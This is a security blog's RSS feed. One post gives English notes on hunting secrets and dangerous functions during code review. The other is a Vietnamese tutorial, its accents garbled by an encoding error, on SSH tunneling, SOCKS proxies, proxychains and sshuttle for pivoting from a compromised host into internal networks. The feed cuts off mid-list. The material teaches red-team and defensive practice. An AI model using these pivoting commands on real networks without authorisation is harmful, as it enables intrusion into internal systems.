<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Tran Quac</title>
        <link>https://tranquac.github.io/posts/</link>
        <description>Recent content in Posts on Tran Quac</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Mon, 30 Aug 2021 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://tranquac.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>My Notes on Code-Review</title>
            <link>https://tranquac.github.io/posts/2021/08/my-notes-on-code-review/</link>
            <pubDate>Mon, 30 Aug 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tranquac.github.io/posts/2021/08/my-notes-on-code-review/</guid>
            <description>The Fast Approach  First Leaked Secrets and Weak Encryption New Patches and Outdated Dependencies Developer Comments Debug Functionalities, Configuration Files, and Endpoints   The Detailed Approach  Important Functions User Input   Reference  The Fast Approach First  Using grep =&amp;gt; Look for specific dangerous patterns like specific -&amp;gt;  functions strings keywords and coding patterns that are known to be dangerous. Like =&amp;gt; eval() function   Focus on the search for dangerous functions used on user-controlled data.</description>
            <content type="html"><![CDATA[<ul>
<li><a href="#the-fast-approach">The Fast Approach</a>
<ul>
<li><a href="#first">First</a></li>
<li><a href="#leaked-secrets-and-weak-wncryption">Leaked Secrets and Weak Encryption</a></li>
<li><a href="#new-patches-and-outdated-dependencies">New Patches and Outdated Dependencies</a></li>
<li><a href="#developer-comments">Developer Comments</a></li>
<li><a href="#debug-functionalities-and-configuration-files-and-endpoints">Debug Functionalities, Configuration Files, and Endpoints</a></li>
</ul>
</li>
<li><a href="#the-detailed-approach">The Detailed Approach</a>
<ul>
<li><a href="#important-functions">Important Functions</a></li>
<li><a href="#user-input">User Input</a></li>
</ul>
</li>
<li><a href="#reference">Reference</a></li>
</ul>
<h2 id="the-fast-approach">The Fast Approach</h2>
<h3 id="first">First</h3>
<ul>
<li>Using grep =&gt; Look for specific dangerous patterns like specific -&gt;
<ul>
<li>functions</li>
<li>strings</li>
<li>keywords</li>
<li>and coding patterns that are known to be dangerous.</li>
<li>Like =&gt; eval() function</li>
</ul>
</li>
<li>Focus on the search for dangerous functions used on user-controlled data.
<ul>
<li>Potential Dangerous Functions =&gt;
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/codereview/function_vuln.PNG" alt=""></li>
<li><strong>Graudit</strong> : grep rough audit - source code auditing tool (<a href="https://github.com/wireghoul/graudit">https://github.com/wireghoul/graudit</a>)</li>
<li><strong>APKleaks</strong> : Scanning APK file for URIs, endpoints &amp; secrets.</li>
<li><strong>gitleaks</strong> : Scan git repos (or files) for secrets using regex and entropy ğŸ”‘(<a href="https://github.com/zricethezav/gitleaks">https://github.com/zricethezav/gitleaks</a>)
(<a href="https://github.com/dwisiswant0/apkleaks">https://github.com/dwisiswant0/apkleaks</a>)</li>
</ul>
</li>
</ul>
<h3 id="leaked-secrets-and-weak-encryption">Leaked Secrets and Weak Encryption</h3>
<ul>
<li>Look for leaked secrets and credentials</li>
<li>Developers make mistakes of hardcoding secrets such as =&gt; <strong>API keys, encryption keys, and database passwords into source code</strong>
<ul>
<li>If Leak -&gt; the attacker can use these credentials to access the companyâ€™s assets.</li>
</ul>
</li>
<li>Grep keywords like =&gt; such as =&gt;
<ul>
<li><strong>key, secret, password, encrypt, API, login, or token</strong></li>
</ul>
</li>
<li>Also <strong>regex</strong> based search for hex or base64 strings
<ul>
<li>It depends on the key format of the credentials we are looking for</li>
<li>Example =&gt; GitHub access tokens are lowercase, 40-character hex strings
<ul>
<li>A search pattern like <strong>[a-f0-9]{40}</strong> would find them in the source code</li>
</ul>
</li>
</ul>
</li>
<li><strong>Entropy scanning</strong> -&gt; Can help us to find secrets that donâ€™t adhere to a specific format.
<ul>
<li>That means =&gt; find secrets that is in randomness formats [Thus unpredictable]</li>
<li>Example =&gt; <strong>aaaaa</strong> =&gt; weak entropy or low entropy</li>
<li>Example =&gt; A longer string with a larger set of characters, like <strong>wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</strong> =&gt; has higher entropy.</li>
<li><strong>Entropy is therefore a good tool to find highly randomized and complex strings, which often indicate a secret</strong></li>
<li>Good Tool =&gt; <strong>TruffleHog</strong> =&gt; <a href="https://github.com/trufflesecurity/truffleHog/">https://github.com/trufflesecurity/truffleHog/</a>
<ul>
<li>searches for secrets by using both regex and entropy scanning</li>
</ul>
</li>
</ul>
</li>
<li><strong>Weak Cryptography or Hashing Algorithm</strong>
<ul>
<li>Hard - During Black Box Pentesting</li>
<li>Easy to spot - During Code Review</li>
<li>Look for issues such as weak encryption keys, breakable encryption algorithms, and weak hashing algorithms</li>
<li>Grep the names of weak algorithms like <strong>ECB, MD4, and MD5</strong>.
<ul>
<li>The application might have functions named after these algorithms, such as
<ul>
<li><strong>ecb(), create_md4(), or md5_hash()</strong></li>
</ul>
</li>
<li>might also have variables with the name of the algorithm, like <strong>ecb_key</strong>, and so on</li>
</ul>
</li>
<li>The impact of weak hashing algorithms depends on where they are used</li>
<li>If they are used to hash values that are not considered security sensitive, their usage will have less of an impact than if they are used to hash passwords.</li>
</ul>
</li>
</ul>
<h3 id="new-patches-and-outdated-dependencies">New Patches and Outdated Dependencies</h3>
<ul>
<li>If have access to the <strong>commit</strong> or <strong>change history</strong> of the source code
<ul>
<li>Focus on the most <strong>recent code fixes</strong> and <strong>security patches</strong></li>
</ul>
</li>
<li>Recent changes havenâ€™t stood the test of time and are more likely to contain bugs.</li>
<li>Look at the protection mechanisms implemented and see if you can bypass them.</li>
<li>Also search for the <strong>programâ€™s dependencies</strong> and check whether any of them <strong>are outdated</strong></li>
<li>Grep for specific code <strong>import functions</strong> in the language we are using with <strong>keywords</strong> =&gt;
<ul>
<li><strong>import, require, and dependencies</strong></li>
</ul>
</li>
<li>Then research the versions theyâ€™re using to see if any vulnerabilities are associated with them in the CVE database
<ul>
<li>The OWASP Dependency-Check tool =&gt; <a href="https://owasp.org/www-project-dependency-check/">https://owasp.org/www-project-dependency-check/</a></li>
</ul>
</li>
</ul>
<h3 id="developer-comments">Developer Comments</h3>
<ul>
<li>We must also look for
<ul>
<li><strong>developer comments</strong> and</li>
<li><strong>hidden debug functionalities</strong>, and</li>
<li><strong>accidentally exposed configuration files</strong></li>
</ul>
</li>
<li>Developers often forgot above things</li>
<li>Developer comments can point out obvious programming mistakes.</li>
<li>We can find developer comments by searching for the comment characters of each programming language
<ul>
<li>Python =&gt; <strong>#</strong></li>
<li>Java / JavaScript / C++ =&gt; <strong>//</strong></li>
</ul>
</li>
<li>Beside comments, we also need to search for =&gt;
<ul>
<li><strong>todo, fix, completed, config, setup</strong>, and <strong>removed</strong> in source code</li>
</ul>
</li>
</ul>
<h3 id="debug-functionalities-and-configuration-files-and-endpoints">Debug Functionalities and Configuration Files and Endpoints</h3>
<ul>
<li>Hidden debug functionalities often lead to privilege escalation,
<ul>
<li>as theyâ€™re intended to let the developers themselves bypass protection mechanisms</li>
</ul>
</li>
<li>We can often find them at special endpoints
<ul>
<li>so search for strings like HTTP, HTTPS, FTP, and dev.</li>
<li>e.g. =&gt; <a href="http://dev.example.com/admin?debug=1&amp;password=password">http://dev.example.com/admin?debug=1&amp;password=password</a> # Access debug panel</li>
</ul>
</li>
<li><strong>Configuration files</strong>
<ul>
<li>allows us to gain more information about the target application and might contain credentials</li>
<li>Look for <strong>filepaths</strong> to configuration files in source code as well</li>
<li>Configuration files often have the file extensions
<ul>
<li><strong>.conf, .env, .cnf, .cfg, .cf, .ini, .sys, or .plist</strong></li>
</ul>
</li>
</ul>
</li>
<li>Additional paths, deprecated endpoints, and endpoints
<ul>
<li>These are endpoints that users might not encounter when using the application normally.</li>
<li>But , If found by attacker =&gt; lead to vulnerabilities such as <strong>authentication bypass</strong> and <strong>sensitive   - information leak</strong>, depending on the exposed endpoint.</li>
<li>search for strings and characters that indicate URLs like
<ul>
<li><strong>HTTP, HTTPS, slashes (/), URL parameter markers (?), file extensions (.php, .html, .js, .json), and so on.</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="the-detailed-approach">The Detailed Approach</h2>
<p><em>Instead of reading the entire codebase line by line, try following strategies to maximize our efficiency</em></p>
<h3 id="important-functions">Important Functions</h3>
<ul>
<li>When reading source code, focus on <strong>important functions</strong>,
<ul>
<li>such as <strong>authentication, password reset, state-changing actions</strong>, and <strong>sensitive info reads</strong>.</li>
</ul>
</li>
<li>Which parts of the application are important depend on the priorities of the organization.</li>
<li>Also review how important components interact with other parts of the application.</li>
<li>This will show us that =&gt; how an attackerâ€™s input can affect different parts of the application.</li>
</ul>
<h3 id="user-input">User Input</h3>
<ul>
<li>Another approach is to carefully read the code that processes user input.</li>
<li>User Input =&gt; the entry points for attackers to exploit the applicationâ€™s vulnerabilities
<ul>
<li>HTTP request parameters</li>
<li>HTTP headers</li>
<li>HTTP request paths</li>
<li>Database entries</li>
<li>File Reads</li>
<li>File Uploads</li>
</ul>
</li>
<li>Focusing on parts of the code that deal with user input will provide a good starting point for identifying potential - dangers</li>
<li>Also must review to how the user input gets stored or transferred.</li>
<li>Also, see whether other parts of the application use the previously processed user input.</li>
<li>We, might find that the same user input interacts differently with various components of the application.</li>
</ul>
<h2 id="reference">Reference</h2>
<ul>
<li>Bug Bounty Bootcamp - Chapper 22 (<a href="https://www.amazon.in/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities-ebook/dp/B08YK368Y3">https://www.amazon.in/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities-ebook/dp/B08YK368Y3</a>)<br>
<strong>Thanks for reading!</strong></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Tunneling, Pivoting to Attack Internal Network</title>
            <link>https://tranquac.github.io/posts/2021/07/tunneling-pivoting-to-attack-internal-network/</link>
            <pubDate>Fri, 30 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tranquac.github.io/posts/2021/07/tunneling-pivoting-to-attack-internal-network/</guid>
            <description>Intro Tools for tunneling  SSH Tunnel  Local Port Porwarding Remote Port Porwarding Dynamic Port Porwarding Sshuttle   Netword Layer Tunnel Transport Layer Tunnel Application Layer Tunnel Other tools pivoting without SSH  Metasploit Framework Chisel Ssf     Create SOCKS Proxy to Attack Internal Network Refer  Intro   CÃ³ ráº¥t nhiá»u bÃ i viÃªt,blog nÃ³i vá» viá»‡c táº¥n cÃ´ng,xÃ¢m nháº­p máº¡ng ná»™i bá»™ trÃªn Internet, nhÆ°ng háº§u háº¿t trong sá»‘ chÃºng táº­p trung vÃ o viá»‡c sá»­ dá»¥ng cÃ¡c cÃ´ng cá»¥, cÃ¡c nguyÃªn táº¯c, tÃ¬nh huá»‘ng Ã­t Ä‘Æ°á»£c Ä‘á» cáº­p, giáº£i thÃ­ch nhiá»u.</description>
            <content type="html"><![CDATA[<ul>
<li><a href="#Intro">Intro</a></li>
<li><a href="#tools-for-tunneling">Tools for tunneling</a>
<ul>
<li><a href="#ssh-tunnel">SSH Tunnel</a>
<ul>
<li><a href="#local-port-forwarding">Local Port Porwarding</a></li>
<li><a href="#remote-port-forwarding">Remote Port Porwarding</a></li>
<li><a href="#dynamic-port-forwarding">Dynamic Port Porwarding</a></li>
<li><a href="#sshuttle">Sshuttle</a></li>
</ul>
</li>
<li><a href="#netword-layer-tunnel">Netword Layer Tunnel</a></li>
<li><a href="#transport-layer-tunnel">Transport Layer Tunnel</a></li>
<li><a href="#application-layer-tunnel">Application Layer Tunnel</a></li>
<li><a href="#other-tools-pivoting-without-ssh">Other tools pivoting without SSH</a>
<ul>
<li><a href="#metasploit-framework">Metasploit Framework</a></li>
<li><a href="#chisel">Chisel</a></li>
<li><a href="#ssf">Ssf</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#create-socks-proxy-to-attack-internal-network">Create SOCKS Proxy to Attack Internal Network</a></li>
<li><a href="#refer">Refer</a></li>
</ul>
<h2 id="intro">Intro</h2>
<ul>
<li>
<p>CÃ³ ráº¥t nhiá»u bÃ i viÃªt,blog nÃ³i vá» viá»‡c táº¥n cÃ´ng,xÃ¢m nháº­p máº¡ng ná»™i bá»™ trÃªn Internet, nhÆ°ng háº§u háº¿t trong sá»‘ chÃºng táº­p trung vÃ o viá»‡c sá»­ dá»¥ng cÃ¡c cÃ´ng cá»¥, cÃ¡c nguyÃªn táº¯c, tÃ¬nh huá»‘ng Ã­t Ä‘Æ°á»£c Ä‘á» cáº­p, giáº£i thÃ­ch nhiá»u. BÃ i viáº¿t nÃ y tÃ´i sáº½ tháº£o luáº­n vá» nguyÃªn táº¯c táº¥n cÃ´ng máº¡ng ná»™i bá»™ Ä‘a dáº¡ng, thiáº¿t káº¿ linh hoáº¡t sÆ¡ Ä‘á»“ táº¥n cÃ´ng máº¡ng ná»™i bá»™ tÆ°Æ¡ng á»©ng theo cÃ¡c tÃ¬nh huá»‘ng cá»§a máº¡ng ná»™i bá»™ khÃ¡c nhau. ÄÃ¢y cÅ©ng lÃ  má»™t trong nhá»¯ng chá»§ Ä‘á» tÃ´i yÃªu thÃ­ch nháº¥t trong an ninh máº¡ng vÃ  hoáº¡t Ä‘á»™ng cá»§a red team nÃ³i chung.</p>
</li>
<li>
<p>Táº¥n cÃ´ng,xÃ¢m nháº­p máº¡ng ná»™i bá»™ lÃ  sá»­ dá»¥ng cÃ¡c cÃ´ng nghá»‡ <em>tunnel</em> khÃ¡c nhau Ä‘á»ƒ vÆ°á»£t qua sá»± phong tá»a, phÃ¡t hiá»‡n cá»§a tÆ°á»ng lá»­a vá»›i cÃ¡c giao thá»©c Ä‘Æ°á»£c tÆ°á»ng lá»­a cho phÃ©p Ä‘á»ƒ Ä‘áº¡t Ä‘Æ°á»£c quyá»n truy cáº­p vÃ o máº¡ng má»¥c tiÃªu bá»‹ cháº·n.</p>
</li>
<li>
<p>CÃ´ng nghá»‡ <em>tunnel</em> (Ä‘Æ°á»ng háº§m) lÃ  má»™t cÃ¡ch Ä‘á»ƒ truyá»n dá»¯ liá»‡u giá»¯a cÃ¡c máº¡ng báº±ng cÃ¡ch sá»­ dá»¥ng cÆ¡ sá»Ÿ háº¡ táº§ng cá»§a Internet. Dá»¯ liá»‡u Ä‘Æ°á»£c truyá»n báº±ng <em>tunnel</em> cÃ³ thá»ƒ lÃ  cÃ¡c <em>frame</em> dá»¯ liá»‡u hoáº·c cÃ¡c <em>package</em> cá»§a cÃ¡c protocol khÃ¡c nhau. <em>Tunnel protocol</em> Ä‘Ã³ng gÃ³i láº¡i cÃ¡c <em>frame</em> dá»¯ liá»‡u hoáº·c <em>package</em> dá»¯ liá»‡u cá»§a cÃ¡c <em>protocol</em> khÃ¡c nÃ y trong má»™t <em>header</em> má»›i Ä‘á»ƒ truyá»n. <em>Header</em> má»›i cung cáº¥p thÃ´ng tin Ä‘á»‹nh tuyáº¿n Ä‘á»ƒ dá»¯ liá»‡u Ä‘Æ°á»£c Ä‘Ã³ng gÃ³i cÃ³ thá»ƒ Ä‘Æ°á»£c truyá»n qua Internet. CÃ¡c package dá»¯ liá»‡u Ä‘Ã³ng gÃ³i Ä‘Æ°á»£c Ä‘á»‹nh tuyáº¿n giá»¯a hai <em>endpoint</em> cá»§a <em>tunnel</em> thÃ´ng qua máº¡ng internet. ÄÆ°á»ng dáº«n logic mÃ  package dá»¯ liá»‡u Ä‘Ã£ Ä‘Ã³ng gÃ³i Ä‘Æ°á»£c truyá»n qua Internet Ä‘Æ°á»£c gá»i lÃ  <em>tunnel</em>. Khi káº¿t thÃºc, dá»¯ liá»‡u sáº½ Ä‘Æ°á»£c giáº£i nÃ©n vÃ  chuyá»ƒn tiáº¿p Ä‘áº¿n Ä‘Ã­ch cuá»‘i cÃ¹ng. LÆ°u Ã½ ráº±ng cÃ´ng nghá»‡ tunnel Ä‘á» cáº­p Ä‘áº¿n toÃ n bá»™ quÃ¡ trÃ¬nh bao gá»“m Ä‘Ã³ng gÃ³i, truyá»n vÃ  giáº£i nÃ©n dá»¯ liá»‡u.</p>
</li>
<li>
<p>CÃ¡c cÃ´ng nghá»‡ <em>tunnel</em> mÃ  chÃºng tÃ´i thÆ°á»ng sá»­ dá»¥ng Ä‘á»ƒ xÃ¢m nháº­p máº¡ng ná»™i bá»™ bao gá»“m dns tunnel, http tunnel, ssh tunnel, icmp (ping) tunnel vÃ  cÃ¡c giao thá»©c khÃ¡c mÃ  tÆ°á»ng lá»­a cho phÃ©p.</p>
</li>
<li>
<p>CÃ¡c cÃ´ng nghá»‡ tunnel nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c phÃ¢n lá»›p theo lá»›p giao thá»©c:</p>
<ul>
<li>Netword layer tunnel: ICMP tunnel, v.v.</li>
<li>Transport layer tunnel: TCP tunnel, UDP tunnel</li>
<li>Application layer tunnel: HTTP, DNS, SSH vÃ  cÃ¡c tunnel khÃ¡c</li>
</ul>
</li>
</ul>
<h2 id="tools-for-tunneling">Tools for Tunneling</h2>
<h3 id="ssh-tunnel">SSH Tunnel</h3>
<ul>
<li>VÃ¬ Ä‘Ã¢y lÃ  má»™t pháº§n quan trá»ng vÃ  sá»­ dá»¥ng cá»±c kÃ¬ há»¯u Ã­ch trong thá»±c táº¿ nÃªn tÃ´i sáº½ nÃ³i kÄ© vá» nÃ³. NÃ³ náº±m trong Application layer tunnel.</li>
</ul>
<h4 id="local-port-forwarding">Local Port Forwarding</h4>
<ul>
<li>
<p><code>ssh [USER@]SSH_SERVER -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT</code><br>
-&gt; Táº¥t cáº£ traffic Ä‘áº¿n [LOCAL_IP:]LOCAL_PORT sáº½ Ä‘Æ°á»£c forward Ä‘áº¿n DESTINATION:DESTINATION_PORT qua ssh tunnel</p>
</li>
<li>
<p><code>ssh [USER@]SSH_SERVER -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT -L [LOCAL_IP2:]LOCAL_PORT2:DESTINATION2:DESTINATION_PORT2</code><br>
-&gt; Multi local port forwarding</p>
</li>
<li>
<p><code>ssh user@10.66.66.4 -CNfg -L 13389:127.0.0.1:3389</code><br>
-&gt; Táº¥t cáº£ traffic Ä‘áº¿n 13389 trÃªn localhost sáº½ Ä‘Æ°á»£c forward tá»›i 127.0.0.1:3389 trÃªn server</p>
</li>
<li>
<p><code>ssh user@10.66.66.4 -CNfg -L 13389:10.9.9.123:3389</code><br>
-&gt; Táº¥t cáº£ traffic Ä‘áº¿n 13389 trÃªn localhost sáº½ Ä‘Æ°á»£c forward tá»›i 10.9.9.123:3389 náº¿u tá»« server cÃ³ thá»ƒ káº¿t ná»‘i Ä‘áº¿n 10.9.9.123:3389</p>
</li>
<li>
<p><code>ssh user@103.81.86.132 -p 9123 -CNfg -L 13389:10.9.9.123:3389</code><br>
-&gt; CÃ³ thá»ƒ forward port ssh tá»« local lÃªn server public (remote port forwarding) Ä‘á»ƒ táº¥t cáº£ má»i ngÆ°á»i tá»« bÃªn ngoÃ i Ä‘á»u cÃ³ thá»ƒ káº¿t ná»‘i Ä‘Æ°á»£c Ä‘áº¿n 10.9.9.123:3389 (máº¡ng local)</p>
</li>
<li>
<p><code>ssh user@103.81.86.132 -p 9123 -CNfg -L 13389:10.9.9.123:3389 -L 13390:10.9.9.123:3390 -L 13391:10.9.9.123:3391</code><br>
-&gt; VÃ­ dá»¥ multi local port forwarding\</p>
</li>
<li>
<p><strong>Local port forwarding thÆ°á»ng Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ kÃ©o má»™t port tá»« server hoáº·c trong vÃ¹ng máº¡ng vá»›i server -&gt; local</strong></p>
</li>
<li>
<p><strong>VÃ­ dá»¥ thá»±c táº¿</strong></p>
</li>
<li>
<p>Ká»‹ch báº£n:<br>
Â Â Â Â [KALI]Â Â Â Â &lt;===&gt;Â Â Â Â [Debian]Â Â Â Â &lt;===&gt;Â Â Â Â [Windows Server]<br>
10.10.10.10Â Â Â Â Â Â Â Â 192.168.10.10Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 172.16.10.10<br>
&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;X&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;&gt;   tcp/445<br>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &mdash;&mdash;&mdash;&mdash;&ndash;V&mdash;&mdash;&mdash;&gt;   tcp/445<br>
&mdash;&mdash;&mdash;&ndash;V&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;&gt; tcp/22</p>
</li>
<li>
<p>Trong trÆ°á»ng há»£p nÃ y : Khi ta khai thÃ¡c vÃ  chiáº¿m quyá»n kiá»ƒm soÃ¡t Ä‘Æ°á»£c mÃ¡y chá»§ 192.168.10.10 cá»§a má»¥c tiÃªu. 172.16.10.10 lÃ  má»™t mÃ¡y chá»§ ná»™i bá»™, khÃ´ng cÃ³ káº¿t ná»‘i internet vÃ  khÃ´ng thá»ƒ káº¿t ná»‘i Ä‘áº¿n máº¡ng bÃªn ngoÃ i. Giáº£ sá»­ nÃ³ Ä‘ang má»Ÿ port 445. Váº­y lÃ m sao cÃ³ thá»ƒ khai thÃ¡c vÃ  enum thÃ´ng tin cá»§a nÃ³ tá»« mÃ¡y cá»§a chÃºng ta?</p>
</li>
<li>
<p>From KALI : <code>ssh -N -L 0.0.0.0:4445:172.16.10.10:445 root@192.168.10.10</code></p>
</li>
<li>
<p>Sau khi sá»­ dá»¥ng lá»‡nh nÃ y trÃªn mÃ¡y KALI chÃºng ta cÃ³ thá»ƒ truy cáº­p 172.16.10.10:445 tá»« <code>localhost:445</code></p>
</li>
</ul>
<h4 id="remote-port-forwarding">Remote Port Forwarding</h4>
<ul>
<li>
<p><code>ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER</code><br>
-&gt; Táº¥t cáº£ traffic Ä‘áº¿n [REMOTE:]REMOTE_PORT trÃªn server sáº½ forward Ä‘áº¿n DESTINATION:DESTINATION_PORT (client)</p>
</li>
<li>
<p><code>ssh user@remote.host -CNfg -R 8080:127.0.0.1:3000</code><br>
-&gt; Táº¥t cáº£ traffic Ä‘áº¿n port 8080 trÃªn server sáº½ Ä‘Æ°á»£c forward Ä‘áº¿n 127.0.0.1:3000 trÃªn mÃ¡y cá»§a báº¡n</p>
</li>
<li>
<p><code>ssh -tt -R 3389:localhost:3389 root@103.81.86.132 -p 9020 ssh -L 103.81.86.132:3389:127.0.0.1:3389 root@localhost -p 9020</code><br>
-&gt; VÃ­ dá»¥ báº¡n cÃ³ má»™t server public. Báº¡n cÃ³ thá»ƒ sá»­ dá»¥ng lá»‡nh nÃ y Ä‘á»ƒ kÃ©o port 3389 tá»« local lÃªn server Ä‘á»ƒ má»i ngÆ°á»i tá»« internet cÃ³ thá»ƒ káº¿t ná»‘i Ä‘áº¿n (trong trÆ°á»ng há»£p nÃ y lÃ  remote desktop). VÃ¬ remote port fowarding máº·c Ä‘á»‹nh chá»‰ foward Ä‘áº¿n interface 127.0.0.1 nÃªn táº£ sáº½ sá»­ dá»¥ng thÃªm má»™t lá»‡nh local port fowarding ná»¯a Ä‘á»ƒ chuyá»ƒn traffic qua interface public.</p>
</li>
<li>
<p><strong>Remote port forwarding thÆ°á»ng Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ kÃ©o 1 port tá»« local hoáº·c trong vÃ¹ng máº¡ng cá»§a local -&gt; server</strong></p>
</li>
<li>
<p><strong>VÃ­ dá»¥ thá»±c táº¿</strong></p>
</li>
<li>
<p>Ká»‹ch báº£n:<br>
Â Â Â Â Â [KALI]Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â [Debian]            <br>
103.81.86.132Â Â Â Â Â Â Â Â Â Â Â Â Â Â 172.16.10.10   <br>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â (Compromised)<br>
Â Â Â Â Â Â Â Â &mdash;&mdash;&mdash;-X&mdash;&mdash;&mdash;-&gt; tcp/22<br>
Â Â Â Â Â Â Â Â &mdash;&mdash;&mdash;-X&mdash;&mdash;&mdash;-&gt; tcp/3306<br>
Â Â Â Â Â Â ANY &lt;&mdash;&mdash;V&mdash;&mdash;&mdash;&mdash;&ndash;</p>
</li>
<li>
<p>From Debian : <code>ssh -N -R 103.81.86.132:2221:127.0.0.1:3306 kali@10.10.10.10</code></p>
</li>
<li>
<p>BÃ¢y giá» trÃªn Kali, khi traffic Ä‘áº¿n tcp / 2221, nÃ³ sáº½ chuyá»ƒn Ä‘áº¿n tcp / 3306 cá»§a Debian</p>
</li>
</ul>
<h4 id="dynamic-port-forwarding">Dynamic Port Forwarding</h4>
<ul>
<li>
<p><code>ssh -D [LOCAL_IP:]LOCAL_PORT [USER@]SSH_SERVER</code></p>
</li>
<li>
<p><code>ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1</code>
-&gt; LÃºc nÃ y 127.0.0.1:7777 sáº½ Ä‘Ã³ng vai trÃ² nhÆ° má»™t SOCKS proxy forward má»i traffic qua nÃ³ Ä‘áº¿n vÃ¹ng máº¡ng cá»§a server</p>
</li>
<li>
<p><strong>Dymanic port forwarding Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ táº¡o SOCKS proxy Ä‘á»ƒ truy cáº­p má»i IP, port trÃªn máº¡ng server qua SOCKs proxy</strong></p>
</li>
<li>
<p><strong>VÃ­ dá»¥ thá»±c táº¿</strong></p>
</li>
<li>
<p>Ká»‹ch báº£n:<br>
Â Â Â [KALI]Â Â Â Â Â Â &lt;===&gt;Â Â Â Â Â Â [Debian]Â Â Â Â Â Â &lt;===&gt;Â Â Â Â Â Â [Windows Server]<br>
10.10.10.10Â Â Â Â Â Â Â Â Â Â Â Â 192.168.10.10Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 172.16.10.10<br>
&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-X&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;&gt;   tcp/445<br>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &mdash;&mdash;&mdash;&mdash;&ndash;V&mdash;&mdash;&mdash;&gt;   tcp/445<br>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &mdash;&mdash;&mdash;&mdash;&ndash;V&mdash;&mdash;&mdash;&gt;   tcp/any<br>
&mdash;&mdash;&mdash;&ndash;V&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;&gt; tcp/22</p>
</li>
<li>
<p>From Kali: <code>ssh -N -D 127.0.0.1:8080 user@192.168.10.10</code></p>
</li>
<li>
<p>LÃºc nÃ y 127.0.0.1:8080 Ä‘Ã³ng vai trÃ² nhÆ° má»™t SOCKS proxy forward toÃ n bá»™ traffic Ä‘i qua nÃ³ tá»›i vÃ¹ng máº¡ng mÃ  192.168.10.10 cÃ³ thá»ƒ káº¿t ná»‘i Ä‘áº¿n.</p>
</li>
<li>
<p>Náº¿u lÃ  http traffic cÃ³ thá»ƒ sá»­ dá»¥ng FoxyProxy, traffic khÃ¡c cÃ³ thá»ƒ sá»­ dá»¥ng proxychains</p>
</li>
<li>
<p>Cáº¥u hÃ¬nh /etc/proxychains.conf:</p>
</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">...
socks4 127.0.0.1 <span style="color:#ae81ff">8080</span>
</code></pre></div><ul>
<li>Scan nmap qua proxychains: <code>proxychains --top-ports -sT -Pn 172.16.10.10</code></li>
</ul>
<h4 id="options">Options</h4>
<ul>
<li>Options:<br>
-C Requests compression of all data (including stdin, stdout, stderr, and data for forwarded X11 and TCP connections)<br>
-N Do not execute a remote command. This is useful for just forwarding ports<br>
-g Allows remote hosts to connect to local forwarded ports.<br>
-L Local port forwarding<br>
-R Local port forwarding<br>
-D Local port forwarding (SOCKS proxy)<br>
-p port</li>
</ul>
<h4 id="sshuttle">Sshuttle</h4>
<ul>
<li>Má»™t cÃ´ng cá»¥ ráº¥t hay chÃºng ta cÅ©ng cÃ³ thá»ƒ sá»­ dá»¥ng lÃ  sshuttle (<a href="https://github.com/sshuttle/sshuttle">https://github.com/sshuttle/sshuttle</a>)</li>
<li>Install
<ul>
<li>Debian    : <code>apt-get install sshuttle -y</code></li>
<li>Rpm-based : <code>yum install sshuttle</code></li>
</ul>
</li>
<li>Usage
<ul>
<li><code>sshuttle -r USERNAME@SERVER_IP 0.0.0.0/0 -vv</code> (má»i káº¿t ná»‘i sáº½ Ä‘i qua server)</li>
<li><code>sshuttle -r sean@10.11.1.251 10.1.1.27</code> (táº¡o káº¿t ná»‘i trá»±c tiáº¿p Ä‘áº¿n 10.1.1.27 thÃ´ng qua trung gian 10.11.1.251)</li>
